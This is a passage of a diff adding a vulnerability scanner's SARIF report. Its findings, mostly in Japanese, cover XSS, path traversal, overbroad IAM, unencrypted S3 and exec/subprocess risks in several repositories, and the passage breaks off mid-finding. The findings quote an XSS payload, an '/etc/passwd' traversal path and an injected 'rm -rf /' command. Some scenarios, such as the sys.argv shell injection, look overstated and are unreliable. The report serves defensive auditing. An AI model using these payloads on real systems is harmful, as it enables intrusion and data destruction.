+            "text": "XSS: ## XSS脆弱性: 外部APIからの未サニタイズデータのDOM挿入\n\n### 問題の詳細\n\nGitHub APIからレスポンスされたデータが、適切なサニタイズやエスケープなしに直接`innerHTML`を用いてDOMに挿入されています。\n\n### 脆弱なコード箇所\n\n```javascript\n// line 4: GitHub APIから外部データを取得\nconst response = await fetch(`https://api.github.com/search/repositories?...`)\nconst data = await response.json()\n\n// line 163-170: 未検証のデータを直接HTMLに挿入\ndata.forEach(v => {\n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>`\n    ul.append(li)\n})\n```\n\n### 攻撃シナリオ\n\n1. **GitHub APIの応答改ざん**: 中間者攻撃(MitM)またはGitHubアカウント侵害により、APIレスポンスを改ざん\n2. **HTMLインジェクション**: `v.full_name`や`v.owner.login`などのフィールドにJavaScriptペイロードを挿入\n   - 例: `v.full_name = \"test<img src=x onerror=alert('XSS')>\"`\n3. **スクリプト実行**: 挿入されたHTMLがパースされ、JavaScriptコードが実行される\n4. **セッションハイジャック**: ユーザーのセッションクッキーやトークン窃取\n\n### PAR分析\n\n- **Principal(信頼できないデータ源)**: GitHub API外部レスポンス (`v.html_url`, `v.full_name`, `v.owner.html_url`, `v.owner.login`)\n- **Action(セキュリティ制御)**: なし - データに対するサニタイズ、バリデーション、エスケープがない\n- **Resource(危機的操作)**: DOM要素への`innerHTML`操作による任意HTMLコンテンツの挿入\n- **Data Flow**: GitHub API → fetch() → response.json() → innerHTML\n\n### 推奨される修正\n\n1. **textContentの使用**\n   ```javascript\n   li.textContent = `★ ${v.stargazers_count} - ${v.full_name} by @${v.owner.login}`\n   ```\n\n2. **適切なHTMLエスケープ**\n   ```javascript\n   const escapeHtml = (text) => {\n     const div = document.createElement('div');\n     div.textContent = text;\n     return div.innerHTML;\n   };\n   ```\n\n3. **テンプレートエンジンの使用**\n   DOMParser等を使用した安全なHTMLパース\n\n4. **Content Security Policy (CSP)**\n   インラインスクリプト実行をブロック",
+            "markdown": "## XSS脆弱性: 外部APIからの未サニタイズデータのDOM挿入\n\n### 問題の詳細\n\nGitHub APIからレスポンスされたデータが、適切なサニタイズやエスケープなしに直接`innerHTML`を用いてDOMに挿入されています。\n\n### 脆弱なコード箇所\n\n```javascript\n// line 4: GitHub APIから外部データを取得\nconst response = await fetch(`https://api.github.com/search/repositories?...`)\nconst data = await response.json()\n\n// line 163-170: 未検証のデータを直接HTMLに挿入\ndata.forEach(v => {\n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>`\n    ul.append(li)\n})\n```\n\n### 攻撃シナリオ\n\n1. **GitHub APIの応答改ざん**: 中間者攻撃(MitM)またはGitHubアカウント侵害により、APIレスポンスを改ざん\n2. **HTMLインジェクション**: `v.full_name`や`v.owner.login`などのフィールドにJavaScriptペイロードを挿入\n   - 例: `v.full_name = \"test<img src=x onerror=alert('XSS')>\"`\n3. **スクリプト実行**: 挿入されたHTMLがパースされ、JavaScriptコードが実行される\n4. **セッションハイジャック**: ユーザーのセッションクッキーやトークン窃取\n\n### PAR分析\n\n- **Principal(信頼できないデータ源)**: GitHub API外部レスポンス (`v.html_url`, `v.full_name`, `v.owner.html_url`, `v.owner.login`)\n- **Action(セキュリティ制御)**: なし - データに対するサニタイズ、バリデーション、エスケープがない\n- **Resource(危機的操作)**: DOM要素への`innerHTML`操作による任意HTMLコンテンツの挿入\n- **Data Flow**: GitHub API → fetch() → response.json() → innerHTML\n\n### 推奨される修正\n\n1. **textContentの使用**\n   ```javascript\n   li.textContent = `★ ${v.stargazers_count} - ${v.full_name} by @${v.owner.login}`\n   ```\n\n2. **適切なHTMLエスケープ**\n   ```javascript\n   const escapeHtml = (text) => {\n     const div = document.createElement('div');\n     div.textContent = text;\n     return div.innerHTML;\n   };\n   ```\n\n3. **テンプレートエンジンの使用**\n   DOMParser等を使用した安全なHTMLパース\n\n4. **Content Security Policy (CSP)**\n   インラインスクリプト実行をブロック"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+                  "index": 10
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "dcd71afd938a44f"
+          },
+          "properties": {
+            "confidence": 0.85,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "GitHub API response data (v.html_url, v.full_name, v.owner.html_url, v.owner.login)",
+            "action": "No sanitization, validation, or HTML escaping applied",
+            "resource": "DOM element innerHTML manipulation",
+            "data_flow": "fetch(GitHub API) → response.json() → innerHTML"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ## XSS脆弱性: 外部APIからの未サニタイズデータのDOM挿入\n\n### 問題の詳細\n\nGitHub APIからレスポンスされたデータが、適切なサニタイズやエスケープなしに直接`innerHTML`を用いてDOMに挿入されています。\n\n### 脆弱なコード箇所\n\n```javascript\n// line 4: GitHub APIから外部データを取得\nconst response = await fetch(`https://api.github.com/search/repositories?...`)\nconst data = await response.json()\n\n// line 163-170: 未検証のデータを直接HTMLに挿入\ndata.forEach(v => {\n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>`\n    ul.append(li)\n})\n```\n\n### 攻撃シナリオ\n\n1. **GitHub APIの応答改ざん**: 中間者攻撃(MitM)またはGitHubアカウント侵害により、APIレスポンスを改ざん\n2. **HTMLインジェクション**: `v.full_name`や`v.owner.login`などのフィールドにJavaScriptペイロードを挿入\n   - 例: `v.full_name = \"test<img src=x onerror=alert('XSS')>\"`\n3. **スクリプト実行**: 挿入されたHTMLがパースされ、JavaScriptコードが実行される\n4. **セッションハイジャック**: ユーザーのセッションクッキーやトークン窃取\n\n### PAR分析\n\n- **Principal(信頼できないデータ源)**: GitHub API外部レスポンス (`v.html_url`, `v.full_name`, `v.owner.html_url`, `v.owner.login`)\n- **Action(セキュリティ制御)**: なし - データに対するサニタイズ、バリデーション、エスケープがない\n- **Resource(危機的操作)**: DOM要素への`innerHTML`操作による任意HTMLコンテンツの挿入\n- **Data Flow**: GitHub API → fetch() → response.json() → innerHTML\n\n### 推奨される修正\n\n1. **textContentの使用**\n   ```javascript\n   li.textContent = `★ ${v.stargazers_count} - ${v.full_name} by @${v.owner.login}`\n   ```\n\n2. **適切なHTMLエスケープ**\n   ```javascript\n   const escapeHtml = (text) => {\n     const div = document.createElement('div');\n     div.textContent = text;\n     return div.innerHTML;\n   };\n   ```\n\n3. **テンプレートエンジンの使用**\n   DOMParser等を使用した安全なHTMLパース\n\n4. **Content Security Policy (CSP)**\n   インラインスクリプト実行をブロック",
+            "markdown": "## XSS脆弱性: 外部APIからの未サニタイズデータのDOM挿入\n\n### 問題の詳細\n\nGitHub APIからレスポンスされたデータが、適切なサニタイズやエスケープなしに直接`innerHTML`を用いてDOMに挿入されています。\n\n### 脆弱なコード箇所\n\n```javascript\n// line 4: GitHub APIから外部データを取得\nconst response = await fetch(`https://api.github.com/search/repositories?...`)\nconst data = await response.json()\n\n// line 163-170: 未検証のデータを直接HTMLに挿入\ndata.forEach(v => {\n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>`\n    ul.append(li)\n})\n```\n\n### 攻撃シナリオ\n\n1. **GitHub APIの応答改ざん**: 中間者攻撃(MitM)またはGitHubアカウント侵害により、APIレスポンスを改ざん\n2. **HTMLインジェクション**: `v.full_name`や`v.owner.login`などのフィールドにJavaScriptペイロードを挿入\n   - 例: `v.full_name = \"test<img src=x onerror=alert('XSS')>\"`\n3. **スクリプト実行**: 挿入されたHTMLがパースされ、JavaScriptコードが実行される\n4. **セッションハイジャック**: ユーザーのセッションクッキーやトークン窃取\n\n### PAR分析\n\n- **Principal(信頼できないデータ源)**: GitHub API外部レスポンス (`v.html_url`, `v.full_name`, `v.owner.html_url`, `v.owner.login`)\n- **Action(セキュリティ制御)**: なし - データに対するサニタイズ、バリデーション、エスケープがない\n- **Resource(危機的操作)**: DOM要素への`innerHTML`操作による任意HTMLコンテンツの挿入\n- **Data Flow**: GitHub API → fetch() → response.json() → innerHTML\n\n### 推奨される修正\n\n1. **textContentの使用**\n   ```javascript\n   li.textContent = `★ ${v.stargazers_count} - ${v.full_name} by @${v.owner.login}`\n   ```\n\n2. **適切なHTMLエスケープ**\n   ```javascript\n   const escapeHtml = (text) => {\n     const div = document.createElement('div');\n     div.textContent = text;\n     return div.innerHTML;\n   };\n   ```\n\n3. **テンプレートエンジンの使用**\n   DOMParser等を使用した安全なHTMLパース\n\n4. **Content Security Policy (CSP)**\n   インラインスクリプト実行をブロック"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+                  "index": 11
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "dcd71afd938a44f"
+          },
+          "properties": {
+            "confidence": 0.85,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "GitHub API response data (v.html_url, v.full_name, v.owner.html_url, v.owner.login)",
+            "action": "No sanitization, validation, or HTML escaping applied",
+            "resource": "DOM element innerHTML manipulation",
+            "data_flow": "fetch(GitHub API) → response.json() → innerHTML"
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "AFO: ## パス検証なしでのファイル操作\n\n`oauth2_file`パラメータが直接ファイル操作に使用されています。\n\n### 問題点:\n- `os.path.expanduser()`は使用されていますが、パストラバーサル攻撃を防ぎません\n- ユーザーが`../../../etc/passwd`のようなパスを指定できます\n- ディレクトリトラバーサル攻撃により、任意の場所にファイルを書き込む可能性があります\n\n### PAR分析:\n1. **Principal (主体)**: 関数引数 `oauth2_file` (ユーザー制御)\n2. **Action (制御)**: `os.path.expanduser()`のみ（パストラバーサル対策なし）\n3. **Resource (リソース)**: ファイルシステム書き込み操作\n\n### 影響:\n- 任意のファイルシステムロケーションへの読み書き\n- システム設定ファイルの上書き\n- 権限昇格の可能性\n\n### 対策:\n- `os.path.abspath()`で絶対パスに正規化\n- ホームディレクトリ内のみに制限\n- パストラバーサルシーケンス(`..`, `//`)の検証",
+            "markdown": "## パス検証なしでのファイル操作\n\n`oauth2_file`パラメータが直接ファイル操作に使用されています。\n\n### 問題点:\n- `os.path.expanduser()`は使用されていますが、パストラバーサル攻撃を防ぎません\n- ユーザーが`../../../etc/passwd`のようなパスを指定できます\n- ディレクトリトラバーサル攻撃により、任意の場所にファイルを書き込む可能性があります\n\n### PAR分析:\n1. **Principal (主体)**: 関数引数 `oauth2_file` (ユーザー制御)\n2. **Action (制御)**: `os.path.expanduser()`のみ（パストラバーサル対策なし）\n3. **Resource (リソース)**: ファイルシステム書き込み操作\n\n### 影響:\n- 任意のファイルシステムロケーションへの読み書き\n- システム設定ファイルの上書き\n- 権限昇格の可能性\n\n### 対策:\n- `os.path.abspath()`で絶対パスに正規化\n- ホームディレクトリ内のみに制限\n- パストラバーサルシーケンス(`..`, `//`)の検証"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/mad-hatter/yagmail/oauth2.py",
+                  "index": 12
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "d5c10423148e3081"
+          },
+          "properties": {
+            "confidence": 0.85,
+            "mitre_attack": [
+              "T1083",
+              "T1005"
+            ],
+            "cwe": [
+              "CWE-22",
+              "CWE-73"
+            ],
+            "owasp": [
+              "A01:2021-Broken Access Control"
+            ],
+            "principal": "User-controlled oauth2_file parameter",
+            "action": "Minimal path validation using os.path.expanduser() only",
+            "resource": "File system write operation (open with 'w' mode)",
+            "data_flow": "oauth2_file (parameter) -> os.path.expanduser() -> open(oauth2_file, 'w') -> filesystem"
+          }
+        },
+        {
+          "ruleId": "OVERPERM",
+          "ruleIndex": 3,
+          "level": "warning",
+          "message": {
+            "text": "OVERPERM: ## 脆弱性: 過度に広い IAM ポリシー権限\n\n### 問題の説明\naws_iam_policy \"replication\" リソースで定義された IAM ポリシーが、S3 バケットに対して過度に広い権限を付与しています。\n\n### 具体的な問題\n\n**1. ワイルドカード権限の過度な使用 (行 65-73)**\n```json\n{\n  \"Action\": [\n    \"s3:ReplicateObject\",\n    \"s3:ReplicateDelete\",\n    \"s3:ReplicateTags\"\n  ],\n  \"Effect\": \"Allow\",\n  \"Resource\": \"${aws_s3_bucket.backup.arn}/*\"\n}\n```\nバックアップバケット内の**すべてのオブジェクト**に対して、レプリケーション関連の強力な権限を無条件で付与しています。\n\n**2. AssumeRole ポリシーの不適切な設定 (行 95-110)**\n```json\n{\n  \"Action\": \"sts:AssumeRole\",\n  \"Principal\": {\n    \"Service\": \"s3.amazonaws.com\"\n  },\n  \"Effect\": \"Allow\",\n  \"Sid\": \"\"\n}\n```\nS3 サービスプリンシパルに対して条件なく AssumeRole を許可しており、任意の S3 オペレーションがこのロールを引き受けることができます。\n\n### セキュリティ影響\n\n**Principal**: AWS S3 サービス (s3.amazonaws.com)\n\n**Action**: \n- IAM ポリシーに条件チェック・スコープ制限がない\n- AssumeRole ポリシーに Principal の検証条件がない\n\n**Resource**: \n- バックアップ S3 バケット内の全オブジェクト\n- ロールの引き受けが可能なすべての AWS リソース\n\n### 推奨される修正\n\n**1. リソース指定の絞り込み**\n- 特定のプレフィックスに限定: `${aws_s3_bucket.backup.arn}/replication/*`\n- または環境別のロール作成と権限の分離\n\n**2. AssumeRole ポリシーの条件付けの追加**\n```json\n{\n  \"Action\": \"sts:AssumeRole\",\n  \"Principal\": {\n    \"Service\": \"s3.amazonaws.com\"\n  },\n  \"Effect\": \"Allow\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:SourceAccount\": \"<ACCOUNT_ID>\"\n    }\n  }\n}\n```\n\n**3. 最小権限の原則 (Principle of Least Privilege) の適用**\n- 必要なアクションのみを明示的に列挙\n- 環境変数または別ファイルで権限定義を管理\n\n### 関連する MITRE ATT&CK テクニック\n- **T1078**: Valid Accounts (過度な権限を持つアカウントの悪用)\n- **T1484**: Domain Policy Modification (IAM ポリシーの悪用による権限昇格)\n",
+            "markdown": "## 脆弱性: 過度に広い IAM ポリシー権限\n\n### 問題の説明\naws_iam_policy \"replication\" リソースで定義された IAM ポリシーが、S3 バケットに対して過度に広い権限を付与しています。\n\n### 具体的な問題\n\n**1. ワイルドカード権限の過度な使用 (行 65-73)**\n```json\n{\n  \"Action\": [\n    \"s3:ReplicateObject\",\n    \"s3:ReplicateDelete\",\n    \"s3:ReplicateTags\"\n  ],\n  \"Effect\": \"Allow\",\n  \"Resource\": \"${aws_s3_bucket.backup.arn}/*\"\n}\n```\nバックアップバケット内の**すべてのオブジェクト**に対して、レプリケーション関連の強力な権限を無条件で付与しています。\n\n**2. AssumeRole ポリシーの不適切な設定 (行 95-110)**\n```json\n{\n  \"Action\": \"sts:AssumeRole\",\n  \"Principal\": {\n    \"Service\": \"s3.amazonaws.com\"\n  },\n  \"Effect\": \"Allow\",\n  \"Sid\": \"\"\n}\n```\nS3 サービスプリンシパルに対して条件なく AssumeRole を許可しており、任意の S3 オペレーションがこのロールを引き受けることができます。\n\n### セキュリティ影響\n\n**Principal**: AWS S3 サービス (s3.amazonaws.com)\n\n**Action**: \n- IAM ポリシーに条件チェック・スコープ制限がない\n- AssumeRole ポリシーに Principal の検証条件がない\n\n**Resource**: \n- バックアップ S3 バケット内の全オブジェクト\n- ロールの引き受けが可能なすべての AWS リソース\n\n### 推奨される修正\n\n**1. リソース指定の絞り込み**\n- 特定のプレフィックスに限定: `${aws_s3_bucket.backup.arn}/replication/*`\n- または環境別のロール作成と権限の分離\n\n**2. AssumeRole ポリシーの条件付けの追加**\n```json\n{\n  \"Action\": \"sts:AssumeRole\",\n  \"Principal\": {\n    \"Service\": \"s3.amazonaws.com\"\n  },\n  \"Effect\": \"Allow\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:SourceAccount\": \"<ACCOUNT_ID>\"\n    }\n  }\n}\n```\n\n**3. 最小権限の原則 (Principle of Least Privilege) の適用**\n- 必要なアクションのみを明示的に列挙\n- 環境変数または別ファイルで権限定義を管理\n\n### 関連する MITRE ATT&CK テクニック\n- **T1078**: Valid Accounts (過度な権限を持つアカウントの悪用)\n- **T1484**: Domain Policy Modification (IAM ポリシーの悪用による権限昇格)\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/main.tf",
+                  "index": 13
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "5f5d89e54d281211"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [],
+            "cwe": [],
+            "owasp": [],
+            "principal": "AWS S3 Service (s3.amazonaws.com)",
+            "action": "No condition checks or scope limitation in IAM policy and AssumeRole policy",
+            "resource": "S3 bucket objects (backup bucket) and role assumption capability",
+            "data_flow": "S3 Service → AssumeRole (unconditioned) → IAM Role with excessive S3 permissions → S3 Bucket resources (wildcard)"
+          }
+        },
+        {
+          "ruleId": "AWS-S3-ENCRYPTION",
+          "ruleIndex": 4,
+          "level": "warning",
+          "message": {
+            "text": "AWS-S3-ENCRYPTION: ## S3バケット暗号化欠落 (backup)\n\n### 脆弱性の詳細\nAWS S3バケット `backup` (行84-90) がサーバーサイド暗号化設定を欠いています。\n\n### PARフレームワーク分析\n- **Principal**: Terraformプロバイダー（AWS認証情報）\n- **Action**: 暗号化制御なし - `server_side_encryption_configuration`ブロックが存在しない\n- **Resource**: S3バケット（データストレージ）\n- **データフロー**: リソース定義 → 暗号化なしバケット作成\n\n### 攻撃シナリオ (T1530)\n1. 保存データの暗号化がないため、S3へのアクセスやバケット内データにアクセスした攻撃者が平文データを読取可能\n2. コンプライアンス要件（HIPAA、PCI-DSS等）への違反\n3. 継続的データ保護（CDP）とリカバリー戦略の不完全性\n\n### 修正方法\n```hcl\nresource \"aws_s3_bucket\" \"backup\" {\n  bucket = \"backup\"\n\n  versioning {\n    enabled = true\n  }\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"backup\" {\n  bucket = aws_s3_bucket.backup.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}\n```\n\n### リスク評価\n- **重要度**: 高（機密データ保護の基本的な要件）\n- **影響範囲**: レプリケーション先バケット（T1537対策不完全）",
+            "markdown": "## S3バケット暗号化欠落 (backup)\n\n### 脆弱性の詳細\nAWS S3バケット `backup` (行84-90) がサーバーサイド暗号化設定を欠いています。\n\n### PARフレームワーク分析\n- **Principal**: Terraformプロバイダー（AWS認証情報）\n- **Action**: 暗号化制御なし - `server_side_encryption_configuration`ブロックが存在しない\n- **Resource**: S3バケット（データストレージ）\n- **データフロー**: リソース定義 → 暗号化なしバケット作成\n\n### 攻撃シナリオ (T1530)\n1. 保存データの暗号化がないため、S3へのアクセスやバケット内データにアクセスした攻撃者が平文データを読取可能\n2. コンプライアンス要件（HIPAA、PCI-DSS等）への違反\n3. 継続的データ保護（CDP）とリカバリー戦略の不完全性\n\n### 修正方法\n```hcl\nresource \"aws_s3_bucket\" \"backup\" {\n  bucket = \"backup\"\n\n  versioning {\n    enabled = true\n  }\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"backup\" {\n  bucket = aws_s3_bucket.backup.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}\n```\n\n### リスク評価\n- **重要度**: 高（機密データ保護の基本的な要件）\n- **影響範囲**: レプリケーション先バケット（T1537対策不完全）"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/main.tf",
+                  "index": 14
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "c319ad90450d72b5"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [],
+            "cwe": [],
+            "owasp": [],
+            "principal": "Terraform provider with AWS credentials",
+            "action": "No encryption configuration applied",
+            "resource": "S3 bucket 'backup' for data replication",
+            "data_flow": "Resource definition → unencrypted S3 bucket creation"
+          }
+        },
+        {
+          "ruleId": "IAM_PRIVILEGE_ESCALATION",
+          "ruleIndex": 5,
+          "level": "warning",
+          "message": {
+            "text": "IAM_PRIVILEGE_ESCALATION: ## IAM 過度な権限付与の検出\n\n**脆弱性**: `aws_iam_policy.replication` が以下の過度な権限を許可しています:\n\n1. **削除権限の付与** (行66-72):\n   - リソース: `${aws_s3_bucket.backup.arn}/*`\n   - 権限: `s3:ReplicateObject`, `s3:ReplicateDelete`, `s3:ReplicateTags`\n   - **リスク**: バックアップバケット内のすべてのオブジェクト削除が可能\n\n2. **ACL読取権限** (行57-58):\n   - 権限: `s3:GetObjectVersionAcl`\n   - **リスク**: オブジェクトのACL情報が読取可能（メタデータ漏洩リスク）\n\n3. **ワイルドカード使用** (行62, 72):\n   - リソース: `${aws_s3_bucket.dodo.arn}/*` と `${aws_s3_bucket.backup.arn}/*`\n   - **リスク**: 権限の最小化原則に違反\n\n**攻撃シナリオ (T1078, T1484)**:\n- このロールを乗っ取った攻撃者がバックアップデータを削除可能\n- データ保護戦略の無効化\n- ランサムウェア攻撃での身代金要求リスク増加\n\n**推奨修正**:\n削除権限は別のポリシーに分離し、明確な運用プロセスの下でのみ許可してください。",
+            "markdown": "## IAM 過度な権限付与の検出\n\n**脆弱性**: `aws_iam_policy.replication` が以下の過度な権限を許可しています:\n\n1. **削除権限の付与** (行66-72):\n   - リソース: `${aws_s3_bucket.backup.arn}/*`\n   - 権限: `s3:ReplicateObject`, `s3:ReplicateDelete`, `s3:ReplicateTags`\n   - **リスク**: バックアップバケット内のすべてのオブジェクト削除が可能\n\n2. **ACL読取権限** (行57-58):\n   - 権限: `s3:GetObjectVersionAcl`\n   - **リスク**: オブジェクトのACL情報が読取可能（メタデータ漏洩リスク）\n\n3. **ワイルドカード使用** (行62, 72):\n   - リソース: `${aws_s3_bucket.dodo.arn}/*` と `${aws_s3_bucket.backup.arn}/*`\n   - **リスク**: 権限の最小化原則に違反\n\n**攻撃シナリオ (T1078, T1484)**:\n- このロールを乗っ取った攻撃者がバックアップデータを削除可能\n- データ保護戦略の無効化\n- ランサムウェア攻撃での身代金要求リスク増加\n\n**推奨修正**:\n削除権限は別のポリシーに分離し、明確な運用プロセスの下でのみ許可してください。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/main.tf",
+                  "index": 15
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "7cf35295a0e1375c"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [],
+            "cwe": [],
+            "owasp": [],
+            "principal": "aws_iam_role.replication (S3 service assumed)",
+            "action": "No additional validation controls on action permissions",
+            "resource": "aws_s3_bucket.backup (all objects via wildcard)",
+            "data_flow": "Infrastructure config → IAM policy → S3 bucket permissions"
+          }
+        },
+        {
+          "ruleId": "RCE",
+          "ruleIndex": 6,
+          "level": "warning",
+          "message": {
+            "text": "RCE: ## リモートコード実行脆弱性\n\n### 脆弱性の詳細\n`exec()` 関数が、JavaScriptファイルから抽出された関数名を使用して動的にコードを生成・実行しています。\n\n### Principal（主体）\n- 関数名パラメータ `f`\n- 出所: `init()` 関数内で EXPOSED_JS_FUNCTIONS パーサーが JavaScriptファイルをスキャンして抽出\n- ファイルシステムから読み込まれるテキスト情報\n\n### Resource（リソース）\n- `exec()` 関数による Python コード実行\n- グローバル名前空間への動的関数定義\n\n### Action（制御）\n攻撃対策が部分的のみ:\n- ✓ 正規表現による簡易検証: `[\n(=]` パターンをチェック（行123）\n- ✗ `exec()` の構文インジェクション防止なし\n- ✗ 関数名のホワイトリスト検証なし\n\n### Data Flow\n```\nJavaScriptファイル (外部)\n  ↓\ninit() - ファイルをスキャン\n  ↓\nEXPOSED_JS_FUNCTIONS パーサー\n  ↓\n_js_functions リスト（抽出された関数名）\n  ↓\n_import_js_function() / _mock_js_function()\n  ↓\nexec('%s = lambda *args: ...' % (f, f), globals())\n  ↓\nPython グローバルスコープへの動的コード実行\n```\n\n### 攻撃シナリオ\n1. 攻撃者が悪意あるJavaScriptファイルを含むリポジトリを作成\n2. `eel.expose(malicious_func_name)` という形式の記述を追加\n3. ユーザーが `init()` でそのディレクトリを指定\n4. パーサーが悪意ある関数名を抽出\n5. `exec()` で動的にコード実行\n\n### リスク評価\n- **攻撃難度**: 中程度（ローカルファイルシステムアクセスが必須）\n- **影響度**: 極大（リモートコード実行）\n- **信頼度**: 80%（パーサーレベルの検証があるが、`exec()` の本質的リスク）\n\n### 推奨改善\n1. `exec()` の使用を避け、`setattr()` を使用して動的属性設定\n2. 関数名のホワイトリスト検証を実装\n3. 安全な代替案：`globals()[f] = lambda *args: _js_call(f, args)`\n",
+            "markdown": "## リモートコード実行脆弱性\n\n### 脆弱性の詳細\n`exec()` 関数が、JavaScriptファイルから抽出された関数名を使用して動的にコードを生成・実行しています。\n\n### Principal（主体）\n- 関数名パラメータ `f`\n- 出所: `init()` 関数内で EXPOSED_JS_FUNCTIONS パーサーが JavaScriptファイルをスキャンして抽出\n- ファイルシステムから読み込まれるテキスト情報\n\n### Resource（リソース）\n- `exec()` 関数による Python コード実行\n- グローバル名前空間への動的関数定義\n\n### Action（制御）\n攻撃対策が部分的のみ:\n- ✓ 正規表現による簡易検証: `[\n(=]` パターンをチェック（行123）\n- ✗ `exec()` の構文インジェクション防止なし\n- ✗ 関数名のホワイトリスト検証なし\n\n### Data Flow\n```\nJavaScriptファイル (外部)\n  ↓\ninit() - ファイルをスキャン\n  ↓\nEXPOSED_JS_FUNCTIONS パーサー\n  ↓\n_js_functions リスト（抽出された関数名）\n  ↓\n_import_js_function() / _mock_js_function()\n  ↓\nexec('%s = lambda *args: ...' % (f, f), globals())\n  ↓\nPython グローバルスコープへの動的コード実行\n```\n\n### 攻撃シナリオ\n1. 攻撃者が悪意あるJavaScriptファイルを含むリポジトリを作成\n2. `eel.expose(malicious_func_name)` という形式の記述を追加\n3. ユーザーが `init()` でそのディレクトリを指定\n4. パーサーが悪意ある関数名を抽出\n5. `exec()` で動的にコード実行\n\n### リスク評価\n- **攻撃難度**: 中程度（ローカルファイルシステムアクセスが必須）\n- **影響度**: 極大（リモートコード実行）\n- **信頼度**: 80%（パーサーレベルの検証があるが、`exec()` の本質的リスク）\n\n### 推奨改善\n1. `exec()` の使用を避け、`setattr()` を使用して動的属性設定\n2. 関数名のホワイトリスト検証を実装\n3. 安全な代替案：`globals()[f] = lambda *args: _js_call(f, args)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/mock-turtle/eel/__init__.py",
+                  "index": 16
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e3e49361107fc72e"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190",
+              "T1059"
+            ],
+            "cwe": [
+              "CWE-77",
+              "CWE-78",
+              "CWE-94"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "Function names extracted from JavaScript files via EXPOSED_JS_FUNCTIONS parser",
+            "action": "Partial validation: regex pattern check for '(' and '=' characters only",
+            "resource": "Python global namespace - exec() function",
+            "data_flow": "JS file content → EXPOSED_JS_FUNCTIONS parser → _js_functions list → _import_js_function() → exec() → global scope"
+          }
+        },
+        {
+          "ruleId": "RCE",
+          "ruleIndex": 6,
+          "level": "warning",
+          "message": {
+            "text": "RCE: ## Remote Code Execution via sys.argv\n\n### 脆弱性の詳細\n`sys.argv`がコマンドライン引数から直接取得され、最小限のバリデーション後に`subprocess.Popen()`に渡されています。\n\n### PAR分析\n\n**Principal**: コマンドラインユーザー(攻撃者が制御可能な`sys.argv`)\n\n**Action**: Line 40-43で`sys.argv[0]`の基本的なチェック（空文字列と\"-c\"の排除）のみ\n\n**Resource**: Line 55の`subprocess.Popen()`によるプロセス実行\n\n### データフロー\n\n```\nuser input (sys.argv)\n  ↓\nLine 40: バリデーション不足（sys.argv[0]のみチェック）\n  ↓\nLine 46/47: sys.argv[1:] または sys.argv を直接使用\n  ↓\nLine 55: subprocess.Popen() に渡される\n  ↓\n[RCE 実行]\n```\n\n### 攻撃シナリオ\n\n攻撃者が意図的に細工された引数でスクリプトを実行した場合、`sys.argv`経由で任意のコマンド実行が可能です：\n\n```bash\npython app.py'; rm -rf /; echo '\n```\n\n### 影響範囲\n- Line 46: `[sys.executable, \"-m\", mod_spec.name] + sys.argv[1:]`\n- Line 47: `[sys.executable] + sys.argv`\n- Line 55-56: 